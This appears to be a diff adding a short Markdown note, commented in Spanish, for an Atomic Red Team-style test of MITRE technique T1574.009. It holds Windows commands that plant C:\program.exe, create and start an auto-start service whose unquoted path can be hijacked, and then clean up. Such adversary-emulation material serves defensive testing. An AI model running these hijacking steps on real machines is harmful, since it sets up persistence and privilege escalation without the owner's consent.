@@ -1,0 +1,18 @@
+################T1574.009.md################
+
+##Atomic Test #1 - Execution of program.exe as service with unquoted service path
+
+#necesitamos el archivo en la carpeta
+```copy "WindowsServiceExample.exe" "C:\Program Files\windows_service.exe"```
+```copy "WindowsServiceExample.exe" "C:\program.exe"```
+```sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto```
+```sc start "Example Service"```
+
+#Borrado
+```sc stop "Example Service" >nul 2>&1```
+```sc delete "Example Service" >nul 2>&1```
+```del "C:\Program Files\windows_service.exe" >nul 2>&1```
+```del "C:\program.exe" >nul 2>&1```
+```del "C:\Time.log" >nul 2>&1```
+
+```PAUSE```
